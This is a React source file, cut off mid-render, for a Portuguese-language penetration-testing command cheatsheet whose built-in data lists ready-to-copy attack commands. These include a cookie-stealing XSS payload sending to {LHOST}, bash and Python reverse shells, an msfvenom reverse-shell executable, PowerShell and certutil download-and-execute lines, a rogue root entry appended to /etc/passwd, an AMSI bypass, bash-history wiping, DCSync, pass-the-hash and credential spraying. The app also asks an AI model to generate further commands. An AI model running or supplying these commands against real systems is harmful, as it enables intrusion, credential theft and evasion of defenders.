import { useState, useEffect, useRef, useCallback } from "react";

// ── DATA ─────────────────────────────────────────────────────────────────────
const CATEGORIES = [
  "All", "Recon", "Web Attacks", "API Attacks", "Shells",
  "Linux PrivEsc", "Windows PrivEsc", "AD Recon", "AD Attacks", "AD Lateral",
  "Sysadmin", "Firewall / FortiGate", "Redes / Cloud", "Hash Cracking",
  "Evasion / OPSEC", "Custom"
];

const TAGS = ["critical", "high", "medium", "osep", "new", "custom"];

const TAG_STYLE = {
  critical: "bg-red-900/60 text-red-300 border-red-700",
  high:     "bg-orange-900/60 text-orange-300 border-orange-700",
  medium:   "bg-yellow-900/60 text-yellow-300 border-yellow-700",
  osep:     "bg-purple-900/60 text-purple-300 border-purple-700",
  new:      "bg-blue-900/60 text-blue-300 border-blue-700",
  custom:   "bg-emerald-900/60 text-emerald-300 border-emerald-700",
};

const TAG_LABEL = {
  critical: "🔴 Critical", high: "🟠 High", medium: "🟡 Medium",
  osep: "💜 OSEP", new: "🔵 New", custom: "🟢 Custom"
};

const INITIAL_COMMANDS = [
  // Recon
  { id: 1, title: "Nmap Full Scan", category: "Recon", tags: ["high"], command: "nmap -sC -sV -p- --min-rate 5000 -oA nmap_full {RHOST}", desc: "Varredura completa com scripts e versões" },
  { id: 2, title: "Nmap UDP Top 20", category: "Recon", tags: ["medium"], command: "nmap -sU --top-ports 20 {RHOST}", desc: "UDP nos 20 portas mais comuns" },
  { id: 3, title: "Gobuster Dir", category: "Recon", tags: ["high"], command: "gobuster dir -u http://{RHOST} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50", desc: "Enumeração de diretórios web" },
  { id: 4, title: "Feroxbuster Recursive", category: "Recon", tags: ["high", "new"], command: "feroxbuster -u http://{RHOST} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,aspx,html --depth 3", desc: "Bruteforce recursivo de diretórios" },
  { id: 5, title: "Ffuf Vhost", category: "Recon", tags: ["medium"], command: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{RHOST} -H 'Host: FUZZ.{DOMAIN}' -fs 0", desc: "Enumeração de virtual hosts" },
  { id: 6, title: "Whatweb", category: "Recon", tags: ["medium"], command: "whatweb -a 3 http://{RHOST}", desc: "Fingerprint de tecnologias web" },

  // Web Attacks
  { id: 7, title: "SQLMap Basic", category: "Web Attacks", tags: ["high"], command: "sqlmap -u 'http://{RHOST}/page?id=1' --dbs --batch --level 3 --risk 2", desc: "Injeção SQL automatizada" },
  { id: 8, title: "SQLMap POST", category: "Web Attacks", tags: ["high"], command: "sqlmap -u 'http://{RHOST}/login' --data='user=a&pass=b' --dbs --batch", desc: "SQLMap em formulário POST" },
  { id: 9, title: "XSS Payload Basic", category: "Web Attacks", tags: ["medium"], command: "<script>fetch('http://{LHOST}:{LPORT}/'+document.cookie)</script>", desc: "Roubo de cookie via XSS" },
  { id: 10, title: "LFI Basic", category: "Web Attacks", tags: ["high"], command: "curl 'http://{RHOST}/page?file=../../../../etc/passwd'", desc: "Local File Inclusion básico" },
  { id: 11, title: "LFI PHP Filter", category: "Web Attacks", tags: ["high"], command: "curl 'http://{RHOST}/page?file=php://filter/convert.base64-encode/resource=index.php'", desc: "LFI com PHP filter para ler código fonte" },
  { id: 12, title: "SSRF Basic", category: "Web Attacks", tags: ["high"], command: "curl 'http://{RHOST}/fetch?url=http://169.254.169.254/latest/meta-data/'", desc: "SSRF para AWS metadata" },

  // API Attacks
  { id: 13, title: "API Enum Endpoints", category: "API Attacks", tags: ["medium"], command: "ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://{RHOST}/api/FUZZ -mc 200,201,204,301,302", desc: "Enumeração de endpoints REST" },
  { id: 14, title: "JWT None Alg", category: "API Attacks", tags: ["critical"], command: "python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')\"", desc: "JWT com algoritmo none (bypass)" },
  { id: 15, title: "API Auth Header Test", category: "API Attacks", tags: ["medium"], command: "curl -H 'Authorization: Bearer {PASS}' http://{RHOST}/api/v1/users", desc: "Teste de autenticação Bearer token" },

  // Shells
  { id: 16, title: "Bash Reverse Shell", category: "Shells", tags: ["critical"], command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", desc: "Reverse shell em bash" },
  { id: 17, title: "Python3 Reverse Shell", category: "Shells", tags: ["critical"], command: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", desc: "Reverse shell Python3" },
  { id: 18, title: "Netcat Listener", category: "Shells", tags: ["high"], command: "nc -lvnp {LPORT}", desc: "Listener netcat" },
  { id: 19, title: "MSFvenom EXE", category: "Shells", tags: ["critical", "osep"], command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe", desc: "Payload Windows reverse shell" },
  { id: 20, title: "Upgrade to PTY", category: "Shells", tags: ["high"], command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo && fg", desc: "Upgrade de shell simples para PTY interativo" },

  // Linux PrivEsc
  { id: 21, title: "LinPEAS", category: "Linux PrivEsc", tags: ["high"], command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", desc: "Enumeração automática de privesc Linux" },
  { id: 22, title: "SUID Find", category: "Linux PrivEsc", tags: ["high"], command: "find / -perm -u=s -type f 2>/dev/null", desc: "Busca por binários SUID" },
  { id: 23, title: "Sudo -l", category: "Linux PrivEsc", tags: ["high"], command: "sudo -l 2>/dev/null", desc: "Lista permissões sudo do usuário atual" },
  { id: 24, title: "Crontab Check", category: "Linux PrivEsc", tags: ["medium"], command: "cat /etc/crontab && ls -la /etc/cron.*", desc: "Verifica crontabs do sistema" },
  { id: 25, title: "Writable /etc/passwd", category: "Linux PrivEsc", tags: ["critical"], command: "echo 'hax:$(openssl passwd -1 hax123):0:0:root:/root:/bin/bash' >> /etc/passwd && su hax", desc: "Adiciona root se /etc/passwd for gravável" },

  // Windows PrivEsc
  { id: 26, title: "WinPEAS", category: "Windows PrivEsc", tags: ["high"], command: "certutil -urlcache -f http://{LHOST}/winpeas.exe C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe", desc: "Download e execução do WinPEAS" },
  { id: 27, title: "PowerShell Bypass", category: "Windows PrivEsc", tags: ["high", "osep"], command: "powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/script.ps1')\"", desc: "Execução de script remoto com bypass de política" },
  { id: 28, title: "AlwaysInstallElevated", category: "Windows PrivEsc", tags: ["critical"], command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", desc: "Verifica AlwaysInstallElevated" },
  { id: 29, title: "SeImpersonate Check", category: "Windows PrivEsc", tags: ["critical"], command: "whoami /priv | findstr /i \"SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege\"", desc: "Verifica privilégios para Potato attacks" },

  // AD Recon
  { id: 30, title: "BloodHound Ingestor", category: "AD Recon", tags: ["critical", "osep"], command: "bloodhound-python -u {USER} -p {PASS} -d {DOMAIN} -dc {DC} -c All --zip", desc: "Coleta dados do AD para BloodHound" },
  { id: 31, title: "Enum4linux", category: "AD Recon", tags: ["high"], command: "enum4linux -a {RHOST}", desc: "Enumeração completa SMB/AD" },
  { id: 32, title: "Kerbrute Users", category: "AD Recon", tags: ["high"], command: "kerbrute userenum --dc {DC} -d {DOMAIN} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", desc: "Enumeração de usuários AD via Kerberos" },
  { id: 33, title: "GetADUsers", category: "AD Recon", tags: ["medium"], command: "GetADUsers.py -all {DOMAIN}/{USER}:{PASS} -dc-ip {DC}", desc: "Lista todos os usuários do domínio" },

  // AD Attacks
  { id: 34, title: "AS-REP Roasting", category: "AD Attacks", tags: ["critical", "osep"], command: "GetNPUsers.py {DOMAIN}/ -usersfile users.txt -dc-ip {DC} -no-pass -format hashcat", desc: "AS-REP Roasting para contas sem pré-autenticação" },
  { id: 35, title: "Kerberoasting", category: "AD Attacks", tags: ["critical", "osep"], command: "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -outputfile kerberoast.txt", desc: "Kerberoasting — coleta TGS para cracking offline" },
  { id: 36, title: "Pass-the-Hash", category: "AD Attacks", tags: ["critical", "osep"], command: "evil-winrm -i {RHOST} -u {USER} -H {HASH}", desc: "Autenticação com NTLM hash via WinRM" },
  { id: 37, title: "psexec PTH", category: "AD Attacks", tags: ["critical"], command: "psexec.py {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}", desc: "Execução remota via PTH com psexec" },
  { id: 38, title: "DCSync", category: "AD Attacks", tags: ["critical", "osep"], command: "secretsdump.py {DOMAIN}/{USER}:{PASS}@{DC} -just-dc-ntlm", desc: "DCSync para extrair hashes do domínio" },

  // AD Lateral
  { id: 39, title: "PsExec", category: "AD Lateral", tags: ["high", "osep"], command: "psexec.py {DOMAIN}/{USER}:{PASS}@{RHOST} cmd.exe", desc: "Execução remota via SMB" },
  { id: 40, title: "CrackMapExec SMB", category: "AD Lateral", tags: ["high"], command: "crackmapexec smb {RHOST}/24 -u {USER} -p {PASS} --shares", desc: "Spray de credenciais na rede via CME" },

  // Sysadmin
  { id: 41, title: "Verificar Portas Abertas", category: "Sysadmin", tags: ["medium"], command: "ss -tlnp", desc: "Lista portas TCP em escuta com processos" },
  { id: 42, title: "Logs em Tempo Real", category: "Sysadmin", tags: ["medium"], command: "journalctl -f -u {USER}", desc: "Segue logs de serviço em tempo real" },
  { id: 43, title: "Uso de Disco", category: "Sysadmin", tags: ["medium"], command: "df -hT && du -sh /*/ 2>/dev/null | sort -rh | head -20", desc: "Visão geral de uso de disco por diretório" },
  { id: 44, title: "Top Processos CPU", category: "Sysadmin", tags: ["medium"], command: "ps aux --sort=-%cpu | head -15", desc: "Top 15 processos por consumo de CPU" },
  { id: 45, title: "Checar Usuários Ativos", category: "Sysadmin", tags: ["medium"], command: "who && last | head -20", desc: "Usuários atualmente logados e histórico" },

  // Firewall / FortiGate
  { id: 46, title: "FortiGate - API Token Test", category: "Firewall / FortiGate", tags: ["medium", "custom"], command: "curl -k -H 'Authorization: Bearer {PASS}' 'https://{RHOST}/api/v2/monitor/system/status'", desc: "Testa conectividade com API REST FortiGate" },
  { id: 47, title: "FortiGate - Listar Políticas", category: "Firewall / FortiGate", tags: ["medium", "custom"], command: "curl -k -H 'Authorization: Bearer {PASS}' 'https://{RHOST}/api/v2/cmdb/firewall/policy'", desc: "Lista todas as políticas de firewall" },
  { id: 48, title: "FortiGate - DHCP Leases", category: "Firewall / FortiGate", tags: ["medium", "custom"], command: "curl -k -H 'Authorization: Bearer {PASS}' 'https://{RHOST}/api/v2/monitor/system/dhcp'", desc: "Lista leases DHCP ativos por VLAN" },
  { id: 49, title: "iptables - Ver Regras", category: "Firewall / FortiGate", tags: ["medium"], command: "iptables -L -n -v --line-numbers", desc: "Lista regras iptables com contadores" },
  { id: 50, title: "iptables - Bloquear IP", category: "Firewall / FortiGate", tags: ["high"], command: "iptables -A INPUT -s {RHOST} -j DROP && iptables -A OUTPUT -d {RHOST} -j DROP", desc: "Bloqueia IP de entrada e saída" },

  // Redes / Cloud
  { id: 51, title: "AWS - Listar S3", category: "Redes / Cloud", tags: ["medium"], command: "aws s3 ls s3:// --profile {USER} 2>/dev/null || aws s3 ls", desc: "Lista todos os buckets S3 acessíveis" },
  { id: 52, title: "AWS - Metadata IMDSv1", category: "Redes / Cloud", tags: ["high"], command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", desc: "Acessa metadados AWS (IMDSv1)" },
  { id: 53, title: "Traceroute", category: "Redes / Cloud", tags: ["medium"], command: "traceroute -T -p 80 {RHOST}", desc: "Traceroute TCP pela porta 80" },
  { id: 54, title: "VPN - Checar Rotas", category: "Redes / Cloud", tags: ["medium", "custom"], command: "ip route show && ip route show table all | grep -v '^default'", desc: "Lista todas as rotas incluindo tabelas customizadas" },

  // Hash Cracking
  { id: 55, title: "Hashcat NTLM", category: "Hash Cracking", tags: ["critical"], command: "hashcat -m 1000 {HASH} /usr/share/wordlists/rockyou.txt --force", desc: "Crack de hash NTLM com rockyou" },
  { id: 56, title: "Hashcat Kerberoast", category: "Hash Cracking", tags: ["critical"], command: "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force", desc: "Crack de TGS Kerberoast" },
  { id: 57, title: "John SSH Key", category: "Hash Cracking", tags: ["high"], command: "ssh2john id_rsa > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt", desc: "Crack de chave SSH privada protegida" },

  // Evasion / OPSEC
  { id: 58, title: "Encode Base64 Payload", category: "Evasion / OPSEC", tags: ["osep", "high"], command: "echo -n '{USER}' | base64 && echo -n '{PASS}' | base64", desc: "Codifica credenciais em base64" },
  { id: 59, title: "PowerShell AMSI Bypass", category: "Evasion / OPSEC", tags: ["critical", "osep"], command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", desc: "Bypass de AMSI no PowerShell" },
  { id: 60, title: "Clear Bash History", category: "Evasion / OPSEC", tags: ["high"], command: "history -c && unset HISTFILE && export HISTSIZE=0", desc: "Limpa histórico de comandos bash" },
];

// ── VARS ─────────────────────────────────────────────────────────────────────
const VAR_KEYS = ["LHOST","RHOST","LPORT","RPORT","DOMAIN","DC","USER","PASS","HASH","URL"];
const VAR_PLACEHOLDERS = {
  LHOST: "10.10.14.1", RHOST: "10.10.10.10", LPORT: "4444", RPORT: "80",
  DOMAIN: "corp.local", DC: "dc01.corp.local", USER: "administrator",
  PASS: "Password123", HASH: "aad3b435...", URL: "http://target/"
};

function applyVars(cmd, vars) {
  return VAR_KEYS.reduce((acc, k) => {
    const val = vars[k] || `{${k}}`;
    return acc.replaceAll(`{${k}}`, val);
  }, cmd);
}

// ── ICONS ─────────────────────────────────────────────────────────────────────
const Icon = ({ name, size = 14 }) => {
  const icons = {
    search: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>,
    copy: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>,
    star: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>,
    starFill: <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" strokeWidth="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>,
    ai: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 2a10 10 0 1 0 10 10"/><path d="M12 8v4l3 3"/><circle cx="18" cy="6" r="3"/></svg>,
    close: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6 6 18M6 6l12 12"/></svg>,
    plus: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M5 12h14M12 5v14"/></svg>,
    vars: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M4 7h16M4 12h16M4 17h10"/></svg>,
    check: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M20 6 9 17l-5-5"/></svg>,
    trash: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M3 6h18M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>,
    export: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>,
    filter: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>,
    terminal: <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>,
  };
  return icons[name] || null;
};

// ── MAIN ──────────────────────────────────────────────────────────────────────
export default function App() {
  const [commands, setCommands] = useState(() => {
    try {
      const saved = localStorage.getItem("cs_custom");
      return saved ? [...INITIAL_COMMANDS, ...JSON.parse(saved)] : INITIAL_COMMANDS;
    } catch { return INITIAL_COMMANDS; }
  });
  const [favs, setFavs] = useState(() => {
    try { return new Set(JSON.parse(localStorage.getItem("cs_favs") || "[]")); }
    catch { return new Set(); }
  });
  const [vars, setVars] = useState(() => {
    try { return JSON.parse(localStorage.getItem("cs_vars") || "{}"); }
    catch { return {}; }
  });
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("All");
  const [tagFilter, setTagFilter] = useState([]);
  const [copied, setCopied] = useState(null);
  const [aiPanel, setAiPanel] = useState(null); // { command, mode: 'explain'|'suggest'|'generate' }
  const [aiResult, setAiResult] = useState("");
  const [aiLoading, setAiLoading] = useState(false);
  const [showVars, setShowVars] = useState(false);
  const [showAdd, setShowAdd] = useState(false);
  const [showFavs, setShowFavs] = useState(false);
  const [newCmd, setNewCmd] = useState({ title: "", category: "Custom", tags: [], command: "", desc: "" });
  const [aiPrompt, setAiPrompt] = useState("");
  const searchRef = useRef(null);

  // Persist
  useEffect(() => { localStorage.setItem("cs_favs", JSON.stringify([...favs])); }, [favs]);
  useEffect(() => { localStorage.setItem("cs_vars", JSON.stringify(vars)); }, [vars]);

  // Keyboard
  useEffect(() => {
    const handler = (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === "k") { e.preventDefault(); searchRef.current?.focus(); }
      if (e.key === "Escape") { setShowVars(false); setShowAdd(false); setAiPanel(null); setShowFavs(false); }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, []);

  const filtered = commands.filter(c => {
    const q = search.toLowerCase();
    const matchSearch = !q || c.title.toLowerCase().includes(q) || c.command.toLowerCase().includes(q) || c.desc?.toLowerCase().includes(q);
    const matchCat = category === "All" || c.category === category;
    const matchTag = tagFilter.length === 0 || tagFilter.some(t => c.tags.includes(t));
    return matchSearch && matchCat && matchTag;
  });

  const favList = commands.filter(c => favs.has(c.id));

  function copyCmd(cmd, id) {
    const resolved = applyVars(cmd, vars);
    navigator.clipboard.writeText(resolved).then(() => {
      setCopied(id);
      setTimeout(() => setCopied(null), 1500);
    });
  }

  function toggleFav(id) {
    setFavs(prev => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  }

  function toggleTag(t) {
    setTagFilter(prev => prev.includes(t) ? prev.filter(x => x !== t) : [...prev, t]);
  }

  function addCustom() {
    if (!newCmd.title || !newCmd.command) return;
    const cmd = { ...newCmd, id: Date.now() };
    const custom = commands.filter(c => c.id > 1000);
    const updated = [...commands, cmd];
    setCommands(updated);
    localStorage.setItem("cs_custom", JSON.stringify([...custom, cmd]));
    setNewCmd({ title: "", category: "Custom", tags: [], command: "", desc: "" });
    setShowAdd(false);
  }

  function deleteCustom(id) {
    const updated = commands.filter(c => c.id !== id);
    setCommands(updated);
    const custom = updated.filter(c => c.id > 1000);
    localStorage.setItem("cs_custom", JSON.stringify(custom));
    setFavs(prev => { const n = new Set(prev); n.delete(id); return n; });
  }

  async function callAI(mode, cmd) {
    setAiLoading(true);
    setAiResult("");
    setAiPanel({ command: cmd, mode });

    const prompts = {
      explain: `Explique em português de forma clara e técnica o que este comando faz, seus parâmetros e quando usá-lo:\n\`\`\`\n${cmd.command}\n\`\`\``,
      suggest: `Sugira 3 variações úteis deste comando para diferentes cenários de pentest/sysadmin. Responda em português com cada variação em bloco de código separado e uma linha explicando o uso:\n\`\`\`\n${cmd.command}\n\`\`\``,
      generate: `Gere um comando de terminal para a seguinte tarefa: "${aiPrompt}". Responda em português com o comando em bloco de código e uma explicação breve.`,
    };

    try {
      const res = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "claude-sonnet-4-20250514",
          max_tokens: 1000,
          messages: [{ role: "user", content: prompts[mode] }],
        }),
      });
      const data = await res.json();
      setAiResult(data.content?.[0]?.text || "Sem resposta.");
    } catch {
      setAiResult("Erro ao contactar a API.");
    }
    setAiLoading(false);
  }

  const groupedByCategory = CATEGORIES.slice(1).reduce((acc, cat) => {
    const items = filtered.filter(c => c.category === cat);
    if (items.length) acc[cat] = items;
    return acc;
  }, {});

  return (
    <div style={{ fontFamily: "'JetBrains Mono', 'Fira Code', monospace", background: "#0a0c0f", minHeight: "100vh", color: "#c9d1d9" }}>
      {/* CSS */}
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@600;800&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 4px; } ::-webkit-scrollbar-track { background: #0d1117; } ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 2px; }
        .cmd-card { transition: all 0.15s ease; border: 1px solid #21262d; }
        .cmd-card:hover { border-color: #00ff88; background: #0d1117 !important; box-shadow: 0 0 20px rgba(0,255,136,0.05); }
        .glow { box-shadow: 0 0 30px rgba(0,255,136,0.15); }
        .tag-pill { font-size: 10px; padding: 1px 7px; border-radius: 3px; border: 1px solid; font-weight: 600; letter-spacing: 0.05em; }
        .btn { cursor: pointer; transition: all 0.15s; border: none; background: none; color: inherit; }
        .btn:hover { opacity: 0.8; }
        .ai-result code { background: #161b22; padding: 2px 6px; border-radius: 3px; color: #79c0ff; font-size: 12px; }
        .ai-result pre { background: #161b22; padding: 12px; border-radius: 6px; border: 1px solid #30363d; overflow-x: auto; margin: 8px 0; font-size: 12px; line-height: 1.6; color: #79c0ff; }
        .ai-result p { line-height: 1.7; margin-bottom: 8px; font-size: 13px; }
        .ai-result h3 { color: #00ff88; margin: 12px 0 6px; font-size: 13px; }
        input, select, textarea { background: #161b22; border: 1px solid #30363d; color: #c9d1d9; border-radius: 6px; outline: none; font-family: inherit; font-size: 13px; }
        input:focus, select:focus, textarea:focus { border-color: #00ff88; box-shadow: 0 0 0 2px rgba(0,255,136,0.1); }
        .cat-btn { transition: all 0.15s; white-space: nowrap; cursor: pointer; }
        .cat-btn.active { color: #00ff88; border-color: #00ff88; background: rgba(0,255,136,0.08); }
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 40; backdrop-filter: blur(4px); }
        .panel { position: fixed; top: 0; right: 0; bottom: 0; width: 420px; background: #0d1117; border-left: 1px solid #21262d; z-index: 50; overflow-y: auto; }
        @media (max-width: 640px) { .panel { width: 100%; } }
        .spinner { width: 20px; height: 20px; border: 2px solid #30363d; border-top-color: #00ff88; border-radius: 50%; animation: spin 0.6s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .scan-line { position: fixed; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, #00ff88, transparent); animation: scan 4s linear infinite; opacity: 0.3; z-index: 100; pointer-events: none; }
        @keyframes scan { 0% { transform: translateY(0); } 100% { transform: translateY(100vh); } }
        .cmd-text { font-size: 12px; line-height: 1.6; color: #79c0ff; word-break: break-all; }
        .resolved { color: #00ff88 !important; }
      `}</style>

      <div className="scan-line" />

      {/* HEADER */}
      <header style={{ borderBottom: "1px solid #21262d", padding: "16px 24px", background: "#0d1117", position: "sticky", top: 0, zIndex: 30 }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", display: "flex", alignItems: "center", gap: 16, flexWrap: "wrap" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <Icon name="terminal" size={20} />
            <span style={{ fontFamily: "'Orbitron', monospace", fontSize: 16, fontWeight: 800, color: "#00ff88", letterSpacing: "0.1em" }}>CHEATSHEET</span>
            <span style={{ fontFamily: "'Orbitron', monospace", fontSize: 10, color: "#58a6ff", marginLeft: 4 }}>v1.0</span>
          </div>

          {/* Search */}
          <div style={{ flex: 1, minWidth: 200, position: "relative" }}>
            <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: "#58a6ff" }}><Icon name="search" /></span>
            <input ref={searchRef} value={search} onChange={e => setSearch(e.target.value)}
              placeholder="Buscar comando... (Ctrl+K)" style={{ width: "100%", padding: "8px 12px 8px 34px" }} />
          </div>

          {/* Actions */}
          <div style={{ display: "flex", gap: 8 }}>
            <button className="btn" onClick={() => setShowVars(true)}
              style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 12px", border: "1px solid #30363d", borderRadius: 6, fontSize: 12, color: "#8b949e" }}>
              <Icon name="vars" /> Variáveis
            </button>
            <button className="btn" onClick={() => setShowFavs(true)}
              style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 12px", border: "1px solid #30363d", borderRadius: 6, fontSize: 12, color: "#f7c948" }}>
              <Icon name="starFill" /> Favs <span style={{ background: "#21262d", borderRadius: 10, padding: "0 6px", fontSize: 11 }}>{favs.size}</span>
            </button>
            <button className="btn" onClick={() => setShowAdd(true)}
              style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 12px", border: "1px solid #00ff88", borderRadius: 6, fontSize: 12, color: "#00ff88", background: "rgba(0,255,136,0.07)" }}>
              <Icon name="plus" /> Novo
            </button>
          </div>
        </div>

        {/* Category bar */}
        <div style={{ maxWidth: 1400, margin: "12px auto 0", display: "flex", gap: 6, overflowX: "auto", paddingBottom: 2 }}>
          {CATEGORIES.map(cat => (
            <button key={cat} className={`cat-btn btn ${category === cat ? "active" : ""}`}
              onClick={() => setCategory(cat)}
              style={{ padding: "4px 12px", border: "1px solid #30363d", borderRadius: 4, fontSize: 11, color: "#8b949e", background: "transparent" }}>
              {cat}
            </button>
          ))}
        </div>

        {/* Tag filters */}
        <div style={{ maxWidth: 1400, margin: "8px auto 0", display: "flex", gap: 6 }}>
          {TAGS.map(t => (
            <button key={t} onClick={() => toggleTag(t)}
              className={`btn tag-pill ${TAG_STYLE[t]}`}
              style={{ opacity: tagFilter.length === 0 || tagFilter.includes(t) ? 1 : 0.3 }}>
              {TAG_LABEL[t]}
            </button>
          ))}
          {tagFilter.length > 0 && (
            <button className="btn" onClick={() => setTagFilter([])} style={{ fontSize: 11, color: "#8b949e", padding: "0 8px" }}>
              ✕ limpar filtro
            </button>
          )}
        </div>
      </header>

      {/* MAIN */}
      <main style={{ maxWidth: 1400, margin: "0 auto", padding: "24px 24px" }}>
        {/* Stats */}
        <div style={{ display: "flex", gap: 12, marginBottom: 24, flexWrap: "wrap" }}>
          {[
            { label: "Total Comandos", val: commands.length, color: "#58a6ff" },
            { label: "Filtrados", val: filtered.length, color: "#00ff88" },
            { label: "Favoritos", val: favs.size, color: "#f7c948" },
            { label: "Customizados", val: commands.filter(c => c.id > 1000).length, color: "#bc8cff" },
          ].map(s => (
            <div key={s.label} style={{ background: "#0d1117", border: "1px solid #21262d", borderRadius: 8, padding: "10px 18px", display: "flex", gap: 10, alignItems: "center" }}>
              <span style={{ fontSize: 22, fontWeight: 700, color: s.color, fontFamily: "'Orbitron', monospace" }}>{s.val}</span>
              <span style={{ fontSize: 11, color: "#8b949e" }}>{s.label}</span>
            </div>
          ))}
        </div>

        {/* AI Generate Box */}
        <div style={{ background: "#0d1117", border: "1px solid #21262d", borderRadius: 10, padding: "16px 20px", marginBottom: 28, borderLeftWidth: 3, borderLeftColor: "#bc8cff" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
            <Icon name="ai" size={16} />
            <span style={{ fontSize: 13, color: "#bc8cff", fontWeight: 600 }}>Gerar Comando com IA</span>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <input value={aiPrompt} onChange={e => setAiPrompt(e.target.value)}
              onKeyDown={e => { if (e.key === "Enter" && aiPrompt) callAI("generate", {}); }}
              placeholder="Ex: listar usuários AD sem autenticação, escanear portas UDP top 100..."
              style={{ flex: 1, padding: "8px 12px" }} />
            <button className="btn" onClick={() => aiPrompt && callAI("generate", {})}
              disabled={!aiPrompt || aiLoading}
              style={{ padding: "8px 16px", background: aiPrompt ? "rgba(188,140,255,0.15)" : "transparent", border: "1px solid #bc8cff", borderRadius: 6, color: "#bc8cff", fontSize: 12, opacity: aiPrompt ? 1 : 0.4 }}>
              {aiLoading && aiPanel?.mode === "generate" ? <div className="spinner" style={{ width: 14, height: 14, display: "inline-block" }} /> : "Gerar ↵"}
            </button>
          </div>
        </div>

        {/* Commands */}
        {category === "All" ? (
          Object.entries(groupedByCategory).map(([cat, items]) => (
            <section key={cat} style={{ marginBottom: 32 }}>
